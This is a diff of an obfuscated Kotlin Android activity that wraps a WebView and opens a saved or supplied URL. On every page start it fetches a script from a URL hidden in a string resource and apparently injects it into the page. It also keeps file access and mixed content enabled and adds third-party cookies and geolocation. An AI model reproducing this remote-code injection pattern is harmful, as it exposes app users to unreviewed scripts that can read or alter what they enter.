@@ -14,23 +14,23 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
+import android.view.View
 import android.provider.MediaStore
 import android.util.Log
 import android.view.KeyEvent
-import android.view.View
-import android.view.WindowManager
-import android.webkit.*
+import java.io.File
 import androidx.annotation.RequiresApi
 import com.android.volley.Request
+import java.util.*
 import com.android.volley.toolbox.StringRequest
+import android.util.Base64.encodeToString
+import android.view.WindowManager
 import com.android.volley.toolbox.Volley
 import com.hythluynlhkjbkflvf.rpogportbpgoglkbm.R
-import java.io.File
+import android.webkit.*
 import java.io.IOException
 import java.text.SimpleDateFormat
-import java.util.*
 import android.util.Base64
-import android.util.Base64.encodeToString
 import com.hythluynlhkjbkflvf.rpogportbpgoglkbm.fnrjfnrjnflkr.fvnklfvlmrtklbvtr.vktfltmrblktr.vnkfk.FgnbgjbGgfhtfjhvgtrFtgjrngbkgrtjbr
 
 class FvfjgvngrfvGhmyknhyju : Activity() {
@@ -40,87 +40,68 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
     private var mCameraPhotoPath: String? = null
     private var URL: String? = null
     private var progressBar: ProgressDialog? = null
-
     @SuppressLint("SetJavaScriptEnabled", "HardwareIds")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.rfgvrvgnrnvkrt_trgvmrkjbvgr)
-
+        setContentView(R.layout.rfnekjnvkgrje_tgrtnjkgjnkrt)
         toScroll(false)
         window.decorView.viewTreeObserver.addOnGlobalLayoutListener {
             val bit = Rect()
             window.decorView.getWindowVisibleDisplayFrame(bit)
-
             val osh = window.decorView.rootView.height
             val ka = osh - bit.bottom
             val kart = ka > osh * 0.1399
             toScroll(kart)
         }
-
         webView = findViewById(R.id.web_view)
-
         webView?.scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
         URL = getURL()
         val alertDialog: AlertDialog = AlertDialog.Builder(this).create()
         ProgressDialog.THEME_DEVICE_DEFAULT_DARK
-
         progressBar = ProgressDialog.show(this, "Loading", "Loading...")
-
-        Log.e("URL", URL.toString())
         if (URL == null) {
             val intent: Intent = intent
             URL = intent.getStringExtra("url")
             saveURL(URL)
         }
-
-
         val cookieManager = CookieManager.getInstance()
         cookieManager.setAcceptCookie(true)
-
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            cookieManager.setAcceptThirdPartyCookies(webView, true)
+        }
         webView?.settings?.javaScriptEnabled = true
         webView?.settings?.loadWithOverviewMode = true
-        webView?.settings?.useWideViewPort = true
         webView?.settings?.domStorageEnabled = true
         webView?.settings?.databaseEnabled = true
         webView?.settings?.setSupportZoom(false)
         webView?.settings?.allowFileAccess = true
         webView?.settings?.allowContentAccess = true
-        webView?.settings?.loadWithOverviewMode = true
         webView?.settings?.useWideViewPort = true
-
-        webView?.settings?.javaScriptEnabled = true
-        webView?.settings?.allowFileAccess = true
-        webView?.settings?.domStorageEnabled = true
+        webView?.settings?.setGeolocationEnabled(true)
+        webView?.settings?.setAppCacheEnabled(true)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             webView?.settings?.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
         }
         webView?.settings?.mediaPlaybackRequiresUserGesture = true
-
         isConnected = isNetworkAvailable
-
         webView?.loadUrl(URL!!)
         webView?.setNetworkAvailable(isConnected)
-
         webView?.webViewClient = object : WebViewClient() {
             @RequiresApi(Build.VERSION_CODES.O)
             override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {
-                println("page loading started")
                 if (!isNetworkAvailable2) {
                     showInfoMessageDialog()
-                    println("network not available")
                     return
-                } else println("network available")
+                }
                 super.onPageStarted(view, url, favicon)
                 loadRemoteScript(view)
             }
-
             override fun onPageFinished(view: WebView?, url: String?) {
                 if (progressBar?.isShowing!!) {
                     progressBar?.dismiss()
                 }
                 saveURL(url)
             }
-
             override fun onReceivedError(
                 view: WebView, errorCode: Int,
                 description: String, failingUrl: String
@@ -129,21 +110,19 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
                 alertDialog.setMessage(description)
                 alertDialog.show()
                 if (errorCode == ERROR_TIMEOUT) {
-                    view.stopLoading() // may not be needed
-                    // view.loadData(timeoutMessageHtml, "text/html", "utf-8");
+                    view.stopLoading()
                 }
             }
-
             @SuppressLint("HardwareIds")
             override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
+                CookieSyncManager.getInstance().sync()
                 view.loadUrl(url)
-                return false
+                return true
             }
-
             @RequiresApi(Build.VERSION_CODES.O)
             private fun loadRemoteScript(
                 view: WebView,
-                url: String = getString(R.string.vnfrnvrtnj_bvgrtvnbkjrtnbjvnkrtivnbjrv)
+                url: String = getString(R.string.rfvbrkdjvkgrtfgvb_bgrtnbkjnkjgrtbgt_gfnbkjrtgbrgtl)
             ) {
                 val queue = Volley.newRequestQueue(baseContext)
                 val stringRequest = StringRequest(
@@ -164,18 +143,13 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
                     },
                     {
                     })
-
                 queue.add(stringRequest)
             }
-
         }
-
         webView?.webChromeClient = object : WebChromeClient() {
-
             @SuppressLint("SimpleDateFormat")
             @Throws(IOException::class)
             private fun createImageFile(): File {
-                // Create an image file name
                 val timeStamp =
                     SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
                 val imageFileName = "JPEG_" + timeStamp + "_"
@@ -183,38 +157,33 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
                     Environment.DIRECTORY_PICTURES
                 )
                 return File.createTempFile(
-                    imageFileName,  /* prefix */
-                    ".jpg",  /* suffix */
-                    storageDir /* directory */
+                    imageFileName,
+                    ".jpg",
+                    storageDir
                 )
             }
-
             override fun onShowFileChooser(
                 view: WebView,
                 filePath: ValueCallback<Array<Uri>>,
                 fileChooserParams: FileChooserParams
             ): Boolean {
-                // Double check that we don't have any existing callbacks
                 if (mFilePathCallback != null) {
                     mFilePathCallback!!.onReceiveValue(null)
                 }
                 mFilePathCallback = filePath
                 var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                 if (takePictureIntent!!.resolveActivity(packageManager) != null) {
-                    // Create the File where the photo should go
                     var photoFile: File? = null
                     try {
                         photoFile = createImageFile()
                         takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
                     } catch (ex: IOException) {
-                        // Error occurred while creating the File
                         Log.e(
                             TAG,
                             "Unable to create Image File",
                             ex
                         )
                     }
-                    // Continue only if the File was successfully created
                     if (photoFile != null) {
                         mCameraPhotoPath = "file:" + photoFile.absolutePath
                         takePictureIntent.putExtra(
@@ -231,7 +200,6 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
                 val intentArray: Array<Intent?>
                 if (takePictureIntent != null) {
                     intentArray = arrayOf(takePictureIntent)
-
                 } else {
                     intentArray = arrayOfNulls(0)
                 }
@@ -246,9 +214,7 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
                 return true
             }
         }
-
     }
-
     public override fun onActivityResult(
         requestCode: Int,
         resultCode: Int,
@@ -260,10 +226,8 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
                 return
             }
             var results: Array<Uri>? = null
-            // Check that the response is a good one
             if (resultCode == Activity.RESULT_OK) {
                 if (data == null) {
-                    // If there is not data, then we may have taken a photo
                     if (mCameraPhotoPath != null) {
                         results = arrayOf(Uri.parse(mCameraPhotoPath))
                     }
@@ -279,7 +243,6 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
         } else
             return
     }
-
     override fun onKeyDown(keyCode: Int, event: KeyEvent): Boolean {
         if (keyCode == KeyEvent.KEYCODE_BACK && webView!!.canGoBack()) {
             webView!!.goBack()
@@ -287,15 +250,12 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
         }
         return false
     }
-
-
     private fun showInfoMessageDialog() {
         val intent =
             Intent(this, FgnbgjbGgfhtfjhvgtrFtgjrngbkgrtjbr::class.java)
         startActivity(intent)
         finish()
     }
-
     private val isNetworkAvailable2: Boolean
         get() {
             println("isNetworkAvailable2 called")
@@ -304,7 +264,6 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
                 .activeNetworkInfo
             return !(info == null || !info.isAvailable || !info.isConnected)
         }
-
     private val isNetworkAvailable: Boolean
         get() {
             val context = applicationContext
@@ -318,26 +277,20 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
             }
             return false
         }
-
     companion object {
-        private const val TAG = "MainActivity"
+        private const val TAG = "FvfjgvngrfvGhmyknhyju"
         private const val INPUT_FILE_REQUEST_CODE = 1
     }
-
-
     private fun saveURL(url: String?) {
         val sp = getSharedPreferences("SP_WEBVIEW_PREFS", Context.MODE_PRIVATE)
         val editor = sp.edit()
         editor.putString("SAVED_URL", url)
-        Log.e("New url", url.toString())
         editor.apply()
     }
-
     private fun getURL(): String? {
         val sp = getSharedPreferences("SP_WEBVIEW_PREFS", Context.MODE_PRIVATE)
         return sp.getString("SAVED_URL", null)
     }
-
     private fun toScroll(flag: Boolean) {
         if (flag) {
             window.clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
@@ -347,7 +300,6 @@ class FvfjgvngrfvGhmyknhyju : Activity() {
                 WindowManager.LayoutParams.FLAG_FULLSCREEN,
                 WindowManager.LayoutParams.FLAG_FULLSCREEN
             )
-
             window.decorView.systemUiVisibility = (
                     View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                             or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
